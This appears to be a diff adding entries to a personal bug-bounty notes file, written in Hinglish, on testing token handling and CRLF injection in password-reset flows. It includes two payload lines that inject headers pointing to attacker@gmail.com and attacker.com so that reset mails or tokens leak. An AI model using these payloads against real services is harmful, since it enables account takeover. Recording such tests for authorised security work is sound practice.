@@ -103,7 +103,15 @@ email confirmation apne app pass ho jata he Oauth ke bajjse
 
 ---------------------------------------------------------------------- 
 
+--------------------- token issues ---------------- 
+search token value in search parameter check if it reflected in any request or response  
 
+use attacker  acc token if it valid boom 
+
+------------------------- end ---------------------------
+
+
+ 
 --------------- case study ---------------------------------- 
 
 after signup go to the email and check link what they want 
@@ -113,7 +121,15 @@ email verify ho gaya
 
 --------------------------------------------------------------- 
 
+-------------------------- crlf in password reset posioning -------------------- 
 
+email='victim@gmail.com%d%acc:attacker@gmail.com'      mail attacker ko bhi jayega
+
+GET /resetpassword?%d%aHost:attacker.com       token leak hoga 
+
+
+
+---------------------- end ---------------------------------------
 
 
 
